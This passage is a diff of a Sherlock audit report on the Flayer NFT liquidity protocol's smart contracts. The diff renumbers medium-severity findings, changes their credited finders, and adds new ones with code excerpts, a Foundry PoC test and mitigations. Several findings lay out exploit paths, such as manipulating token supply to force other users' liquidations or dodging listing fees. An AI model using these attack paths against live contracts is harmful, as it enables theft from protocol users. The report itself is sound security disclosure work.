+As per-NFT royalties are not set, this makes the contract a single recipient of the same `_royaltyBps` across all NFTs, as implemented by OZ's `ERC2981` contract. No matter what happens next, it's impossible to either correctly collect the appropriate royalty amounts at marketplaces, or to correctly attribute the royalties to different artists.
+
+### Impact
+
+Definite loss of funds (NFT creators won't receive the appropriate royalties):
+
+- Marketplaces who sell NFTs on L2s are not able to pay correct amounts of royalties
+- Artists who created the NFTs in collections on L1, which are bridged to L2, are not able to track the amounts of royalties they have the right to receive (which effectively deprives them of said royalties)
+
+### Mitigation
+
+Both for `ERC721Bridgable` and `ERC1155Bridgable` have to implement a system which:
+
+- correctly reports per-NFT royalty amounts on L2 via `royaltyInfo`
+- correctly collects the appropriate royalty amounts, and tracks the per-NFT recipients of said amounts on L1.
+
+_Notice: this finding concerns only with the absence of the correct tracking and reporting system as per EIP-2981. Royalty distribution system from L2 to L1 is out of scope of this finding._
 
 # Issue M-8: There is a logical error in the removeFeeExemption() function. 
 
@@ -2891,7 +3824,7 @@ Manual Review
 Source: https://github.com/sherlock-audit/2024-08-flayer-judging/issues/244 
 
 ## Found by 
-Aymen0909, BugPull, BugsFinders0x, Tendency, ZeroTrust
+Audinarey, Aymen0909, BugPull, BugsFinders0x, Ollam, Tendency, ZeroTrust
 ### Summary
 
 It Is possible for everyone to front-run the calls to the `execute()` function, by listing an NFT in the `Listings.sol` contract, right after the quorum is reached. 
@@ -3266,7 +4199,7 @@ Perform a check to prevent a collection that is up for deletion from being liste
 Source: https://github.com/sherlock-audit/2024-08-flayer-judging/issues/318 
 
 ## Found by 
-0x37, 0xAlix2, Audinarey, BugPull, Hearmen, OpaBatyo, dany.armstrong90, kuprum, merlinboii, novaman33, robertodf
+0x37, 0xAlix2, Audinarey, BugPull, Hearmen, OpaBatyo, dany.armstrong90, merlinboii, novaman33, robertodf
 ## Summary
 If a collection has been shutdown, it can later be re-initialized for use in the protocol again. But any attempts to shut it down again will fail due to a varaible not being reset when the first shutdown is made.
 ## Vulnerability Detail
@@ -3301,7 +4234,135 @@ Manual Review
 ## Recommendation
 Reset variable back to 0 when all users have claimed their tokens and the process of shutting down a collection is completely finished.
 
-# Issue M-11: A user loses funds when he modifies only price of listings. 
+# Issue M-11: There is a logical error in the _distributeFees() function, resulting in an unfair distribution of fees. 
+
+Source: https://github.com/sherlock-audit/2024-08-flayer-judging/issues/328 
+
+## Found by 
+ZeroTrust
+## Summary
+There is a logical error in the _distributeFees() function, resulting in an unfair distribution of fees.
+## Vulnerability Detail
+```javascript
+        function _distributeFees(PoolKey memory _poolKey) internal {
+        // If the pool is not initialized, we prevent this from raising an exception and bricking hooks
+@>>        PoolId poolId = _poolKey.toId();
+        PoolParams memory poolParams = _poolParams[poolId];
+
+        if (!poolParams.initialized) {
+            return;
+        }
+
+        // Get the amount of the native token available to donate
+        uint donateAmount = _poolFees[poolId].amount0;
+
+        // Ensure that the collection has sufficient fees available
+        if (donateAmount < donateThresholdMin) {
+            return;
+        }
+
+        // Reduce our available fees
+        _poolFees[poolId].amount0 = 0;
+
+        // Split the donation amount between beneficiary and LP
+@>>        (uint poolFee, uint beneficiaryFee) = feeSplit(donateAmount);
+
+        // Make our donation to the pool, with the beneficiary amount remaining in the
+        // contract ready to be claimed.
+        if (poolFee > 0) {
+            // Determine whether the currency is flipped to determine which is the donation side
+            (uint amount0, uint amount1) = poolParams.currencyFlipped ? (uint(0), poolFee) : (poolFee, uint(0));
+            BalanceDelta delta = poolManager.donate(_poolKey, amount0, amount1, '');
+
+            // Check the native delta amounts that we need to transfer from the contract
+            if (delta.amount0() < 0) {
+                _pushTokens(_poolKey.currency0, uint128(-delta.amount0()));
+            }
+
+            if (delta.amount1() < 0) {
+                _pushTokens(_poolKey.currency1, uint128(-delta.amount1()));
+            }
+
+            emit PoolFeesDistributed(poolParams.collection, poolFee, 0);
+        }
+
+        // Check if we have beneficiary fees to distribute
+        if (beneficiaryFee != 0) {
+            // If our beneficiary is a Flayer pool, then we make a direct call
+@>>            if (beneficiaryIsPool) {
+                // As we don't want to make a transfer call, we just extrapolate
+                // the required logic from the `depositFees` function.
+@>>                _poolFees[_poolKeys[beneficiary].toId()].amount0 += beneficiaryFee;
+                emit PoolFeesReceived(beneficiary, beneficiaryFee, 0);
+            }
+            // Otherwise, we can just update the escrow allocation
+            else {
+                beneficiaryFees[beneficiary] += beneficiaryFee;
+                emit BeneficiaryFeesReceived(beneficiary, beneficiaryFee);
+            }
+        }
+    }
+```
+If beneficiaryIsPool = true, then BaseImplementation::beneficiary is the Flayer protocol’s NFT Collection. We can also confirm this from the setBeneficiary() function.
+```javascript
+    function setBeneficiary(address _beneficiary, bool _isPool) public onlyOwner {
+        beneficiary = _beneficiary;
+        beneficiaryIsPool = _isPool;
+
+        // If we are setting the beneficiary to be a Flayer pool, then we want to
+        // run some additional logic to confirm that this is a valid pool by checking
+        // if we can match it to a corresponding {CollectionToken}.
+@>>        if (_isPool && address(locker.collectionToken(_beneficiary)) == address(0)) {
+            revert BeneficiaryIsNotPool();
+        }
+
+        emit BeneficiaryUpdated(_beneficiary, _isPool);
+    }
+```
+The function checks that the NFT collection must have the corresponding collectionToken.
+
+
+```javascript
+     function feeSplit(uint _amount) public view returns (uint poolFee_, uint beneficiaryFee_) {
+        // If our beneficiary royalty is zero, then we can exit early and avoid reverts
+        if (beneficiary == address(0) || beneficiaryRoyalty == 0) {
+            return (_amount, 0);
+        }
+
+        // Calculate the split of fees, prioritising benefit to the pool
+        beneficiaryFee_ = _amount * beneficiaryRoyalty / ONE_HUNDRED_PERCENT;
+        poolFee_ = _amount - beneficiaryFee_;
+    }
+```
+In the feeSplit() function, the fees are divided into two parts: poolFee (95%) and beneficiaryFee (5%). The poolFee goes to the LP Holders of the collectionToken for some NFT, while the beneficiaryFee goes to the LP Holders of the collectionToken for the Flayer protocol’s NFT.
+
+The root cause of the issue is that when _distributeFees() is called for the collectionToken of the Flayer protocol’s NFT Collection (which we will refer to as the collectionToken of Flayer), _poolKeys[beneficiary].toId() and PoolId poolId = _poolKey.toId(); result in the same poolId. This leaves 5% of the fees undistributed, which is clearly wrong. It should distribute 100% of the fees to the current LP Holders.
+
+According to the current logic in the code, when _distributeFees() is called for the collectionToken of the Flayer protocol’s NFT, it always leaves 5% of the fees unallocated. If a user provides liquidity to the pool, 95% of the fees will be distributed to the original LP Holders. However, the new LP Holder, upon joining, will immediately gain a share of the remaining 5% of the fees. That's wrong.
+
+
+## Impact
+The newly joined LP Holders receive an unfair portion of the fees, leading to a loss for the original LP Holders.
+## Code Snippet
+https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/implementation/UniswapImplementation.sol#L308
+
+
+## Tool used
+
+Manual Review
+
+## Recommendation
+```diff
+     // Split the donation amount between beneficiary and LP
+     (uint poolFee, uint beneficiaryFee) = feeSplit(donateAmount);
+
++    if(poolId==_poolKeys[beneficiary].toId()){
++        poolFee = donateAmount;
++        beneficiaryFee = 0;
++    }
+```
+
+# Issue M-12: A user loses funds when he modifies only price of listings. 
 
 Source: https://github.com/sherlock-audit/2024-08-flayer-judging/issues/340 
 
@@ -3481,7 +4542,114 @@ Manual Review
     }
 ```
 
-# Issue M-12: In the unlockProtectedListing() function, the interest that was supposed to be distributed to LP holders was instead burned. 
+# Issue M-13: Price limit is used as the price range in internal swaps, causing swap TXs to revert 
+
+Source: https://github.com/sherlock-audit/2024-08-flayer-judging/issues/402 
+
+## Found by 
+0xAlix2
+### Summary
+
+When initializing a swap on Uniswap V4, the user inputs a price limit that represents the sqrt price at which, if reached, the swap will stop executing, from [Uni V4 code](https://github.com/Uniswap/v4-core/blob/main/src/interfaces/IPoolManager.sol#L146-L153).
+```solidity
+struct SwapParams {
+    /// Whether to swap token0 for token1 or vice versa
+    bool zeroForOne;
+    /// The desired input amount if negative (exactIn), or the desired output amount if positive (exactOut)
+    int256 amountSpecified;
+    /// The sqrt price at which, if reached, the swap will stop executing
+    uint160 sqrtPriceLimitX96;
+}
+```
+When a swap happens in a Uniswap pool, in [`Pool::swap`](https://github.com/Uniswap/v4-core/blob/main/src/libraries/Pool.sol#L279-L460) the swap calculation happens by calling `SwapMath.computeSwapStep`, where the input price limit is translated to a price target using `SwapMath.getSqrtPriceTarget`. Knowing that the price target represents the "The price target for the next swap step"
+https://github.com/Uniswap/v4-core/blob/main/src/libraries/SwapMath.sol#L19
+
+On the other hand, when the internal swap is done in the Uniswap implementation, `SwapMath.computeSwapStep` is called while passing the price limit as the price target.
+
+```solidity
+(, ethIn, tokenOut, ) = SwapMath.computeSwapStep({
+    sqrtPriceCurrentX96: sqrtPriceX96,
+    sqrtPriceTargetX96: params.sqrtPriceLimitX96,
+    liquidity: poolManager.getLiquidity(poolId),
+    amountRemaining: int(amountSpecified),
+    feePips: 0
+});
+```
+
+This affects the in/out token calculation, as it will calculate those values based on a wrong target, forcing swap TXs to unexpectedly revert.
+
+### Root Cause
+
+When calculating internal swaps, the input price limit is used as the price range for the swap calculation, [here](https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/implementation/UniswapImplementation.sol#L522) and [here](https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/implementation/UniswapImplementation.sol#L537).
+
+### Impact
+
+Swap transactions will revert in most cases; DOSing swaps.
+
+### PoC
+
+Add the following test in `flayer/test/UniswapImplementation.t.sol`:
+
+```solidity
+function test_WrongPriceTargetUsed() public withLiquidity withTokens {
+    bool flipped = false;
+    PoolKey memory poolKey = _poolKey(flipped);
+    CollectionToken token = flipped ? flippedToken : unflippedToken;
+    ERC721Mock nft = flipped ? flippedErc : unflippedErc;
+
+    uint256 fees = 10 ether;
+    deal(address(token), address(this), fees);
+    token.approve(address(uniswapImplementation), type(uint).max);
+    uniswapImplementation.depositFees(address(nft), 0, fees);
+
+    // token0 = WETH, token1 = token
+    assertEq(address(Currency.unwrap(poolKey.currency0)), address(WETH));
+    assertEq(address(Currency.unwrap(poolKey.currency1)), address(token));
+
+    // amount of token out to receive
+    uint amountSpecified = 15 ether;
+
+    // Uniswap implementation + pool manager have enough tokens to fulfill the swap
+    assertGt(
+        token.balanceOf(address(uniswapImplementation)) +
+            token.balanceOf(address(uniswapImplementation.poolManager())),
+        amountSpecified
+    );
+    // This contract has more than enough WETH to fulfill the swap
+    assertEq(WETH.balanceOf(address(this)), 1000 ether);
+
+    // Swap WETH -> TOKEN
+    vm.expectRevert();
+    poolSwap.swap(
+        poolKey,
+        IPoolManager.SwapParams({
+            zeroForOne: true,
+            amountSpecified: int(amountSpecified),
+            sqrtPriceLimitX96: TickMath.MIN_SQRT_PRICE + 1
+        }),
+        PoolSwapTest.TestSettings({
+            takeClaims: false,
+            settleUsingBurn: false
+        }),
+        ""
+    );
+}
+```
+
+### Mitigation
+
+In `UniswapImplementation::beforeSwap`, whenever the internal swap is being computed, i.e. by calling `SwapMath.computeSwapStep`, translate the passed price limit to price range, using `SwapMath.getSqrtPriceTarget`, by doing something similar to:
+```solidity
+(, ethIn, tokenOut, ) = SwapMath.computeSwapStep({
+    sqrtPriceCurrentX96: sqrtPriceX96,
+    sqrtPriceTargetX96: SwapMath.getSqrtPriceTarget(zeroForOne, step.sqrtPriceNextX96, params.sqrtPriceLimitX96),
+    liquidity: poolManager.getLiquidity(poolId),
+    amountRemaining: int(amountSpecified),
+    feePips: 0
+});
+```
+
+# Issue M-14: In the unlockProtectedListing() function, the interest that was supposed to be distributed to LP holders was instead burned. 
 
 Source: https://github.com/sherlock-audit/2024-08-flayer-judging/issues/431 
 
@@ -3612,12 +4780,12 @@ Manual Review
 ## Recommendation
 Distribute the interest to the LP holders.
 
-# Issue M-13: Users can dodge `createListing` fees 
+# Issue M-15: Users can dodge `createListing` fees 
 
 Source: https://github.com/sherlock-audit/2024-08-flayer-judging/issues/440 
 
 ## Found by 
-OpaBatyo, valuevalk
+Ollam, OpaBatyo, ZeroTrust, valuevalk, zzykxx
 ## Summary
 Users can abuse a loophole to create a listing for 5% less tax than intended, hijack others' tokens at floor value and perpetually relist for free.
 ## Vulnerability Detail  
@@ -3663,139 +4831,163 @@ Manual Review
 ## Recommendation
 Impose higher minimum collateral and lower tokenTaken (e.g 0.2e18 and 0.8e18) so the `KEEPER_REWARD` would not cover the cost of burning collateral during reservation, making this exploit unprofitable.
 
-# Issue M-14: Manipulating collection token's total supply to manipulate `utilizationRate` 
+# Issue M-16: manipulation of the Utilization Rates using the locker.sol function deposit and redeem to Force Liquidations 
 
-Source: https://github.com/sherlock-audit/2024-08-flayer-judging/issues/448 
+Source: https://github.com/sherlock-audit/2024-08-flayer-judging/issues/476 
 
 ## Found by 
-0x73696d616f, BugPull, ComposableSecurity, Ironsidesec, OpaBatyo, jo13
+BugPull, ComposableSecurity, OpaBatyo, jo13
 ## Summary
-You can liquidate the genuine and healthy protected listings by manipulating the utilization rate. You can also unlock your protected listing by paying minimal tax by again manipulating the utlization rate. Same with adjusting the listing to add/remove the token taken amounts, do add/remove more/less than allowed due to the listing health/unlock price manipulation that directly depends on the utilization rate. 
-
-Root cause: allowing to mint/redeem collection tokens in a single transaction/block.
-Impact: ultra-high
-Likelikood: high
-
+A user with a significant number of *NFTs* can manipulate the `totalsupply` of *ERC20* tokens to indirectly push protected listings towards liquidation by influencing the `utilizationrate` and associated .
 ## Vulnerability Detail
-`utilizationRate` which is used in accounting the tax and debt, fee calculation can be manipulated which in turn manipulates the protected listing health and listing's unlock price. This is possible because, the `utilizationRate` depends on the collection token's total supply which is again manipulatable by depositing multiple tokens inside the locker.
-The flow will be like this, deposit token ids into locker and mint the collection token of a collection, so that total supply increases. So now utilization rate decreases if total supply increases. Now interact with PROTECTED LISTING to adjust, unlock, or liquidate. All these actions depend on the listing health, listing's unlock price which depends on the difference between the compounding factor between different timestamps. These compound factors rely on utilization rate, which is manipulatable at will.
+The vulnerability arises from the ability of a user to `deposit` and `redeem` any quantities of NFTs,without fees As shown in the `locker.sol` contract :
+-the `deposit` function increase the *totalsupply* by `mint` function.
 
-Once protected listing actions are done, you can redeem the collection tokens that were minted and you will get back the token ids. This is pure manipulation, all done in one transaction. Attackers can even increase the utilization rate by first redeeming their collateral token that they bought with WETH from uniV4 pool, and decrease the total supply to minimum due to multiple redemption, and then interact with protected listing actions (adjust, liquidate, unlock) and then due to total supply reduction, the utilization rate is pumped to max and now you can liquidate at high debts and negative listing healths which are actually health when not manipulated. After all actions, you will deposit those token ids back and make the system back to normal. But this second strategy won't have high likelihood, because the tokens redeemable will be low because the deposited ones mostly is a listing, and you cannot redeem a listed token id.
+``` js
+function deposit(address _collection, uint[] calldata _tokenIds, address _recipient) public
+    {
+     //.....
+        ICollectionToken token = _collectionToken[_collection];
+        token.mint(_recipient, tokenIdsLength * 1 ether * 10 ** token.denomination());
+    //.....
+     }
+ ```
+-and decrease the *totalsupply* using the `redeem` function. 
 
-**One of the attack flow :**
-1. User creates a protected listing of BAYC 25, which has current collection total supply of 20e18 tokens (, also 10 listings count, 10 locked when pool initialization), so current utilization is 0.5e18 (50%).
-2. And user listed his at 2e18 compound factor at checkpoint 500, and user takes 0.7e18 tokens when listing
-3. So after 3 days, the checkpoint is 515 and compound factor is at 2.5e18 and the unlock price of the listing is 0.78e18 (0.08 ether tax) at current utilization rate
-4. And again 1 day passes, and the there isn't been much activity for a day, so no checkpoint is updated. In these times, the lister can deposit some BAYC into locker and pump the collection token supply and reduce the utilization rate by 1/3 or even half, and then now unlock the listing.
-5. Now the lister is supposed to pay 0.8 as repayment, but he will only pay 0.78 because the utilization rate is heavily down and the new compound factor at the current timestamp is literally close to the previous checkpoint. Hence the fee owed to repay will be 0.79 + some 0.002 depending on how well the utilization rate is dumped down.  Check [here](https://github.com/sherlock-audit/2024-08-flayer/blob/0ec252cf9ef0f3470191dcf8318f6835f5ef688c/flayer/src/contracts/ProtectedListings.sol#L304-L305).
+```js 
 
-So, this is how the fee manipulation will happen. There are other flows too, but you get it. Manipulate the utilization rate, then adjust/liquidate/unlock your /other listing to abuse the manipulated unlock price/listing healths.
-
-
-https://github.com/sherlock-audit/2024-08-flayer/blob/0ec252cf9ef0f3470191dcf8318f6835f5ef688c/flayer/src/contracts/ProtectedListings.sol#L273
-
-https://github.com/sherlock-audit/2024-08-flayer/blob/0ec252cf9ef0f3470191dcf8318f6835f5ef688c/flayer/src/contracts/ProtectedListings.sol#L582-L591
-
-https://github.com/sherlock-audit/2024-08-flayer/blob/0ec252cf9ef0f3470191dcf8318f6835f5ef688c/flayer/src/contracts/ProtectedListings.sol#L497-L500
-
-https://github.com/sherlock-audit/2024-08-flayer/blob/0ec252cf9ef0f3470191dcf8318f6835f5ef688c/flayer/src/contracts/ProtectedListings.sol#L607-L617
-
-```solidity
-ProtectedListings.sol
-
-240:     function utilizationRate(address _collection) public view virtual returns (uint listingsOfType_, uint utilizationRate_) {
-242:         listingsOfType_ = listingCount[_collection];
-243: 
-246:         if (listingsOfType_ != 0) {
-247:             ICollectionToken collectionToken = locker.collectionToken(_collection);
-248: 
-249:             // If we have no totalSupply, then we have a zero percent utilization
-254:             uint totalSupply = collectionToken.totalSupply();
-255:             if (totalSupply != 0) {
-256:   >>>           utilizationRate_ = (listingsOfType_ * 1e36 * 10 ** collectionToken.denomination()) / totalSupply;
-257:             }
-258:         }
-259:     }
-
-
-585:     function _currentCheckpoint(address _collection) internal view returns (Checkpoint memory checkpoint_) {
-587:   >>>   (, uint _utilizationRate) = utilizationRate(_collection);
-588: 
-590:         Checkpoint memory previousCheckpoint = collectionCheckpoints[_collection][collectionCheckpoints[_collection].length - 1];
-591: 
-593:         checkpoint_ = Checkpoint({
-594:             compoundedFactor: locker.taxCalculator().calculateCompoundedFactor({
-595:                 _previousCompoundedFactor: previousCheckpoint.compoundedFactor,
-596:   >>>           _utilizationRate: _utilizationRate,
-597:                 _timePeriod: block.timestamp - previousCheckpoint.timestamp
-598:             }),
-599:             timestamp: block.timestamp
-600:         });
-601:     }
-
-
-499:     function getProtectedListingHealth(address _collection, uint _tokenId) public view listingExists(_collection, _tokenId) returns (int) {
-502:         return int(MAX_PROTECTED_TOKEN_AMOUNT) - int(unlockPrice(_collection, _tokenId));
-503:     }
-
-
-612:     function unlockPrice(address _collection, uint _tokenId) public view returns (uint unlockPrice_) {
-614:         ProtectedListing memory listing = _protectedListings[_collection][_tokenId];
-615: 
-617:         unlockPrice_ = locker.taxCalculator().compound({
-618:             _principle: listing.tokenTaken,
-619:   >>>       _initialCheckpoint: collectionCheckpoints[_collection][listing.checkpoint],
-620:   >>>       _currentCheckpoint: _currentCheckpoint(_collection)
-621:         });
-622:     }
+ function redeem(address _collection, uint[] calldata _tokenIds, address _recipient)  public 
+   { 
+     //...
+ collectionToken_.burnFrom(msg.sender, tokenIdsLength * 1 ether * 10 ** collectionToken_.denomination());
+    //..
+  }
 
 ```
-https://github.com/sherlock-audit/2024-08-flayer/blob/0ec252cf9ef0f3470191dcf8318f6835f5ef688c/flayer/src/contracts/TaxCalculator.sol#L69-L90
+so a user with a lot of nft could thereby alter the total supply of ERC20 tokens ,This manipulation affects the utilization rate, 
+https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/ProtectedListings.sol#L261-L276
+which in turn influences interest rates that used directly to calculate `calculateCompoundedFactor`
 
-```solidity
-TaxCalculator.sol
+```js 
 
-110:     function compound(
-111:         uint _principle,
-112:         IProtectedListings.Checkpoint memory _initialCheckpoint,
-113:         IProtectedListings.Checkpoint memory _currentCheckpoint
-114:     ) public pure returns (uint compoundAmount_) {
-117:         if (_initialCheckpoint.timestamp >= _currentCheckpoint.timestamp) return _principle;
-120: 
-123:         uint compoundedFactor = _currentCheckpoint.compoundedFactor * 1e18 / _initialCheckpoint.compoundedFactor;
-124:         compoundAmount_ = _principle * compoundedFactor / 1e18;
-125:     }
+ function calculateCompoundedFactor(uint _previousCompoundedFactor, uint _utilizationRate, uint _timePeriod) public view returns (uint compoundedFactor_) {
+        uint interestRate = this.calculateProtectedInterest(_utilizationRate);
+        uint perSecondRate = (interestRate * 1e18) / (365 * 24 * 60 * 60);
+        compoundedFactor_ = _previousCompoundedFactor * 
+        (1e18 + (perSecondRate / 1000 * _timePeriod)) / 1e18;
+    }
 
 ```
+
+we use this to Calculate the amount of tax that would need to be paid against protected listings. in the function `unlockPrice`
+https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/ProtectedListings.sol#L607-L617
+ this function is used to check the the protected listing health in `getProtectedListingHealth` that used in `liquidateProtectedListing` An exploitation of the direct relation between the totalsupply and the liquidation is possible by a malicious user who owns half of the **NFTs**. The user can performs an action that causes the liquidation of the positions of the other participants and receives the `KEEPER_REWARD` for being a keeper for initiating the liquidation process. In addition, the user can buy up the one that had its **NFT** liquidated at an auction at a discount price which increases their gain. 
 
 ## Impact
-You can liquidate the genuine and healthy protected listings by manipulating the utilization rate. You can also unlock your protected listing by paying minimal tax by again manipulating utlization rate. Same with adjusting the listing to add/remove the token taken amounts, do add/remove more/less than allowed due to the listng health/unlock price manipulation that directly depends on the utilization rate. 
-
-Likelikood : high to medium.
-Loss of funds, so High severity.
-
+The impact of this vulnerability is that it allows a user to exploit the system to force protected listings into liquidation. This can lead to losses for other users whose listings are liquidated. It undermines the stability and fairness of the protocol by enabling manipulative tactics.
 ## Code Snippet
-https://github.com/sherlock-audit/2024-08-flayer/blob/0ec252cf9ef0f3470191dcf8318f6835f5ef688c/flayer/src/contracts/TaxCalculator.sol#L69-L90
-
-https://github.com/sherlock-audit/2024-08-flayer/blob/0ec252cf9ef0f3470191dcf8318f6835f5ef688c/flayer/src/contracts/ProtectedListings.sol#L273
-
-https://github.com/sherlock-audit/2024-08-flayer/blob/0ec252cf9ef0f3470191dcf8318f6835f5ef688c/flayer/src/contracts/ProtectedListings.sol#L582-L591
-
-https://github.com/sherlock-audit/2024-08-flayer/blob/0ec252cf9ef0f3470191dcf8318f6835f5ef688c/flayer/src/contracts/ProtectedListings.sol#L497-L500
-
-https://github.com/sherlock-audit/2024-08-flayer/blob/0ec252cf9ef0f3470191dcf8318f6835f5ef688c/flayer/src/contracts/ProtectedListings.sol#L607-L617
-
+https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/ProtectedListings.sol#L261-L276
+https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/ProtectedListings.sol#L607-L617
 ## Tool used
 
 Manual Review
 
 ## Recommendation
+use fees in deposit and redeem 
 
-Block mint/redeem within a single transaction or within 1 block. In that case, sudden deposit and redeem in 1 tx is not possible, so manipulating utilization rate is also not possible.
+# Issue M-17: `CollectionShutdown::execute()` doesn't ensure that all locked NFTs are sold 
 
-Do the changes in Locker.sol, by introducing a new state, that `mininumDelay = 1 minute`, so that when a deposit is made, any new deposit/redeem can be done only after a minute. Or better track in number of blocks, like `minBlocksDelay`. Most dex protocols or LRT ones have this mechanism.
+Source: https://github.com/sherlock-audit/2024-08-flayer-judging/issues/502 
 
-# Issue M-15: `UniswapImplementation::beforeSwap()` might revert when swapping native tokens to collection tokens 
+## Found by 
+IMAFVCKINSTARRRRRR, McToady, zzykxx
+### Summary
+
+_No response_
+
+### Root Cause
+
+[CollectionShutdown::execute()](https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/utils/CollectionShutdown.sol#L231) doesn't ensure that all tokens of the collection being shutdown are added to the sudoswap pool in order to be sold.
+
+This function takes as input an array of the token IDs to be sold via sudoswap pool. In case an NFT ID that's locked in the protocol is not in this array the NFT will stay locked and not sold.
+
+Even if the function is only callable by admins the admins have no control on the order and the moment transactions are executed and such scenarios should be handled at the moment of execution.
+
+### Internal pre-conditions
+
+_No response_
+
+### External pre-conditions
+
+_No response_
+
+### Attack Path
+
+1. The protocol currently holds NFTs `55` and `56`, admin calls [CollectionShutdown::execute()](https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/utils/CollectionShutdown.sol#L231) by passing as a parameter `[55,56]`. 
+2. While the [CollectionShutdown::execute()](https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/utils/CollectionShutdown.sol#L231) transaction is in the mempool a deposit of NFT `60` is done via [Locker::deposit()](https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/Locker.sol#L144).
+3. The [CollectionShutdown::execute()](https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/utils/CollectionShutdown.sol#L231) transaction goes through and a sudoswap pool selling `55` and `56` is created
+4. NFT `60` is locked in the protocol
+
+### Impact
+
+NFTs that should be sold are locked in the procotol, which leads to an indirect loss of funds to collection tokens holders.
+
+### PoC
+
+_No response_
+
+### Mitigation
+
+In [CollectionShutdown::execute()](https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/utils/CollectionShutdown.sol#L231) make sure all tokens currently locked in the protocol are added to the sudoswap pool.
+
+# Issue M-18: If the royalties receiver it's a smart contract it might be impossible to collect L2 royalties 
+
+Source: https://github.com/sherlock-audit/2024-08-flayer-judging/issues/509 
+
+## Found by 
+zzykxx
+### Summary
+
+_No response_
+
+### Root Cause
+
+The function [InfernalRiftAbove::claimRoyalties()](https://github.com/sherlock-audit/2024-08-flayer/blob/main/moongate/src/InfernalRiftAbove.sol#L251) can only be called by the receiver of the royalties:
+
+```solidity
+(address receiver,) = IERC2981(_collectionAddress).royaltyInfo(0, 0);
+
+// Check that the receiver of royalties is making this call
+if (receiver != msg.sender) revert CallerIsNotRoyaltiesReceiver(msg.sender, receiver);
+```
+
+This is fine for EOAs but is problematic if `receiver` is a contract that doesn't have a way to call [InfernalRiftAbove::claimRoyalties()](https://github.com/sherlock-audit/2024-08-flayer/blob/main/moongate/src/InfernalRiftAbove.sol#L251), as this would result in the `receiver` not being able to claim the royalties collected by NFTs bridged to L2.
+
+### Internal pre-conditions
+
+_No response_
+
+### External pre-conditions
+
+_No response_
+
+### Attack Path
+
+_No response_
+
+### Impact
+
+If the royalties `receiver` is a smart contract that doesn't have a way to call [InfernalRiftAbove::claimRoyalties()](https://github.com/sherlock-audit/2024-08-flayer/blob/main/moongate/src/InfernalRiftAbove.sol#L251) it's impossible to claim the royalties, which will be stuck.
+
+### PoC
+
+_No response_
+
+### Mitigation
+
+Allow royalties to be claimed to the `receiver` address by anybody when `receiver` is a smart contract.
+
+# Issue M-19: `UniswapImplementation::beforeSwap()` might revert when swapping native tokens to collection tokens 
 
 Source: https://github.com/sherlock-audit/2024-08-flayer-judging/issues/517 
 
@@ -3975,7 +5167,7 @@ In [UniswapImplementation::beforeSwap()](https://github.com/sherlock-audit/2024-
     }
 ```
 
-# Issue M-16: User can cancel or modify Dutch auctions, compromising market integrity and user trust 
+# Issue M-20: User can cancel or modify Dutch auctions, compromising market integrity and user trust 
 
 Source: https://github.com/sherlock-audit/2024-08-flayer-judging/issues/520 
 
@@ -4079,7 +5271,7 @@ _No response_
 
 _No response_
 
-# Issue M-17: Reserving a listing checkpoints the collection's `compoundFactor` at an intermediary higher compound factor 
+# Issue M-21: Reserving a listing checkpoints the collection's `compoundFactor` at an intermediary higher compound factor 
 
 Source: https://github.com/sherlock-audit/2024-08-flayer-judging/issues/533 
 
@@ -4350,144 +5542,7 @@ index eb39e7a..c8eac4d 100644
 
 ```
 
-
-# Issue M-18: Compounded factor for the current block's checkpoint will not be updated and allows for locking in manipulated compounded factor for any new checkpoint 
-
-Source: https://github.com/sherlock-audit/2024-08-flayer-judging/issues/540 
-
-## Found by 
-Sentryx
-### Summary
-
-Due to the way the **ProtectedListings**#`_currentCheckpoint()` calculates the `_timePeriod` for which to calculate the compounded factor, the `compoundFactor` for the current block's checkpoint will actually **not** be updated in consecutive calls to `_createCheckpoint()` within the same block and will remain as recorded initially.
-
-
-### Root Cause
-
-As `_createCheckpoint()` is called for the first time in a block, a new **Checkpoint** struct will be pushed to the `collectionCheckpoints[_collection]` array of checkpoints. The next time `_createCheckpoint()` is called in the same block, `previousCheckpoint` in the `_currentCheckpoint()` function will now be the last checkpoint we've just created. And it will have `timestamp` = `block.timestamp`.
-
-When calculating the current checkpoint, the `_currentCheckpoint()` function will calculate the accrued interest for the `_timePeriod` between the `block.timestamp` and `previousCheckpoint.timestamp`, which will work for the first time the checkpoint is recorded for the current block, but on consecutive calls the `_timePeriod` will evaluate to 0 due to `block.timestamp = previousCheckpoint.timestamp` and thus their difference will be 0. And when `_timePeriod` is 0 no interest will be compounded resulting in the checkpoint's compound factor staying the same.
-
-The code obviously intends to update the compound factor of the current block's checkpoint if one exists but will fail to do so.
-
-https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/ProtectedListings.sol#L530-L571
-```solidity
-    function _createCheckpoint(address _collection) internal returns (uint index_) {
-        // Determine the index that will be created
-        index_ = collectionCheckpoints[_collection].length;
-
-        // ...
-
-        // Get our new (current) checkpoint
-→       Checkpoint memory checkpoint = _currentCheckpoint(_collection);
-
-→       // If no time has passed in our new checkpoint, then we just need to update the
-→       // utilization rate of the existing checkpoint.
-        if (checkpoint.timestamp == collectionCheckpoints[_collection][index_ - 1].timestamp) {
-            // @audit Will NOT change the compoundedFactor's value.
-→           collectionCheckpoints[_collection][index_ - 1].compoundedFactor = checkpoint.compoundedFactor;
-            return index_;
-        }
-
-        // Store the new (current) checkpoint
-        collectionCheckpoints[_collection].push(checkpoint);
-    }
-```
-
-https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/ProtectedListings.sol#L580-L596
-```solidity
-    function _currentCheckpoint(address _collection) internal view returns (Checkpoint memory checkpoint_) {
-        // Calculate the current interest rate based on utilization
-        (, uint _utilizationRate) = utilizationRate(_collection);
-
-        // Update the compounded factor with the new interest rate and time period
